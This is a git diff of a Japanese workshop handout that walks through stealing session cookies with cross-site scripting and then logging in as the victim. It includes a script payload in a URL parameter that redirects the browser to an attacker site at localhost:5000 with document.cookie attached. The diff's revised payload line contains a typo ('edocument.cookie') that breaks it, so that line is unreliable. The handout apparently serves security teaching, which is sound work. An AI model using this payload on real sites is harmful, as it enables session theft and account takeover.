@@ -26,7 +26,7 @@ $ browser http://当日教える.com
 1. `/` において， `user: sampleuser`, `pass: samplepass` と入力してログイン
 1. `/login` にて，「ようこそ，sampleuserさん!!」と表示されることを確認
 
-_目的: `sampleuser/samplepass` を知らないのに，`sampleuser`としてログインする_
+_攻撃目的: `sampleuser/samplepass` を知らないのに，`sampleuser`としてログインする_
 
 ## 攻撃手順
 
@@ -47,7 +47,7 @@ $ browser http://localhost:5000
 1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)
 
 ```bash
-$ browser http://当日教える.com/?confirm=<script>window.location="http://localhost:5000/?sid=" + document.cookie</script>
+$ browser http://当日教える.com/?confirm=<script>window.location="http://localhost:5000/?sid="+edocument.cookie</script>
 ```
 
 ### Cookie中のセッションIDを使って脆弱サイトにログイン
